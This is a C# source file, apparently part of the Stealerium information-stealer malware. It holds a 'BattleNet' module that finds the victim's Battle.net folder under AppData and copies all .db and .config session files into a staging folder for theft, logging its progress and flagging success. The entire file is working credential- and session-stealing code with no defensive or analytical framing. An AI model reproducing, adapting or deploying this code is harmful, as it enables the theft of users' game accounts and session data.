using System;
using System.IO;
using Stealerium.Stub.Helpers;

namespace Stealerium.Stub.Target.Gaming
{
    internal sealed class BattleNet
    {
        private static readonly string Path = global::System.IO.Path.Combine(
            Paths.Appdata, "Battle.net");

        public static void GetBattleNetSession(string sSavePath)
        {
            if (!Directory.Exists(Path))
            {
                Logging.Log("BattleNET >> Session not found");
                return;
            }

            try
            {
                Directory.CreateDirectory(sSavePath);

                foreach (var found in new[] { "*.db", "*.config" })
                {
                    var extracted = Directory.GetFiles(Path, found, SearchOption.AllDirectories);

                    foreach (var file in extracted)
                        try
                        {
                            string todir = null;
                            var finfo = new FileInfo(file);
                            if (finfo.Directory != null)
                                todir = finfo.Directory != null && finfo.Directory.Name == "Battle.net"
                                    ? sSavePath
                                    : global::System.IO.Path.Combine(sSavePath, finfo.Directory.Name);
                            // Create dir
                            if (!Directory.Exists(todir))
                                if (todir != null)
                                    Directory.CreateDirectory(todir);
                            // Copy
                            if (todir != null) finfo.CopyTo(global::System.IO.Path.Combine(todir, finfo.Name));
                        }
                        catch (Exception ex)
                        {
                            Logging.Log("BattleNET >> Failed copy file\n" + ex, false);
                            return;
                        }
                }

                Counter.BattleNet = true;
            }
            catch (Exception ex)
            {
                Logging.Log("BattleNET >> Error\n" + ex, false);
            }
        }
    }
}